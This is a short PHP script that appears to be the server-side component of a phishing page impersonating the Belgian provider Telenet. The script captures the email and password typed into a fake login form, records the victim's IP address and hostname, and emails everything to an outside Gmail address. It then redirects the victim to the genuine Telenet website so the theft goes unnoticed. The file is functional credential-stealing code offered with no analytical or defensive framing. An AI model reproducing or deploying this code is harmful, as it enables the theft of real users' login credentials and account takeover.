<?php
$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);

$message  = "==================+  ( Tel) +==================\n";

$message .= "login :".$_POST['email']."\n";
$message .= "pass :".$_POST['pwdd']."\n";
$message .= "===================\n";

$message .= "Client IP : ".$ip."\n";
       
$message .= "HostName : ".$hostname."\n";
$message .= "----------------------Tel---------------------\n";


$send = "kinnek9@gmail.com";

$subject = "telenet $ip";

mail($send,$subject,$message);


header("Location: https://www2.telenet.be/fr/");
?>


